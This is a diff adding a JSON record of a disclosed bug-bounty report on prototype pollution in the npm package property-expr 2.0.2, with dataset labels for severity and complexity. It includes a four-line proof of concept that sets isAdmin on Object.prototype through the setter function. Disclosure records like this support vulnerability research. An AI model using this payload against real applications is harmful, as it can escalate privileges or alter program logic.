@@ -1,0 +1,46 @@
+{
+    "reported_to": "Node.js third-party modules",
+    "reported_by": "ahihi ",
+    "title": "property-expr - Prototype pollution",
+    "content": "\nI would like to report Prototype pollution in property-expr\nIt allows attacker to modify the prototype of a base object.\nModule\nmodule name: property-expr\nversion: 2.0.2\nnpm page: https://www.npmjs.com/package/property-expr\nModule Description\nTiny property path utilities, including path parsing and metadata and deep property setters and getters\nModule Stats\nReplace stats below with numbers from npm\u2019s module page:\n[1,057,612] weekly downloads\nVulnerability\nVulnerability Description\nThe functions setter can be tricked into modifying properties of the Object prototype. These properties will be present on all objects.\nSteps To Reproduce:\nRun the following code:\nCode 131 Bytes\n1let expr = require('property-expr')\n2obj = {}\n3expr.setter('constructor.prototype.isAdmin')(obj,true)\n4console.log({}.isAdmin) // true\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: [Y/N] N\nI opened an issue in the related repository: [Y/N] N\nImpact\nModify Object prototype can lead to Dos, RCE, change code logic flow.\n\n",
+    "severity": [
+        7.3,
+        null
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Modification of Assumed-Immutable Data (MAID)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1600934400,
+    "report_url": "https://hackerone.com/reports/910206",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "vuln_category": "CODE",
+    "steps": [
+        [
+            1,
+            "let expr = require('property-expr')"
+        ],
+        [
+            2,
+            "obj = {}"
+        ],
+        [
+            3,
+            "expr.setter('constructor.prototype.isAdmin')(obj,true)"
+        ],
+        [
+            4,
+            "console.log({}.isAdmin) // true"
+        ]
+    ],
+    "vuln_description": "The functions setter in property-expr can be tricked into modifying properties of the Object prototype, leading to prototype pollution. This allows an attacker to modify properties that will be present on all objects, potentially leading to DoS, RCE, or changes in code logic flow.",
+    "reason": "The vulnerability involves a straightforward exploitation of prototype pollution in a widely-used utility function. The attack is simple and does not require complex interactions or state manipulation. Prototype pollution is a well-known vulnerability pattern in JavaScript, making this discovery relatively straightforward for someone familiar with the concept.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
